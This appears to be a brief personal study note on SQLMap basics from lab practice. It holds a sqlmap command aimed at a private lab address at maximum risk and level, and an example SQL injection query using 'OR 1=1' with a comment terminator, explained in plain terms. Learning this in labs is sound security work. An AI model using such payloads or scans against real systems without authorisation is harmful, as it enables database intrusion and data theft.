# SQLMap: The Basics

## Usefull commands I've used&#x20;

{% code overflow="wrap" %}
```sql
for this to work, you need to have the GET request 
sqlmap -u "http://10.10.63.72/ai/includes/user_login?email=root" --risk=3 --level=5 --batch

-all

```
{% endcode %}

{% code overflow="wrap" %}
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';

#- "-- -';" With --: Clean and controlled. The attacker silences the rest of the query so nothing breaks. It's the standard way to guarantee the injection works.

#- Without --: Risky. The injected code might clash with the rest of the original query — especially if it's still expecting quotes or other values afterward.
#- It’s like sneaking past security using a fake ID (OR 1=1). Without --, the guard might still ask a follow-up question and catch you. With --, you basically end the conversation and walk right in.
```
{% endcode %}

<figure><img src="../../.gitbook/assets/dae3c749-9f3d-41b9-8b08-2ce351869316.webp" alt=""><figcaption><p>AI is still so bad at creating these kind of images.</p></figcaption></figure>

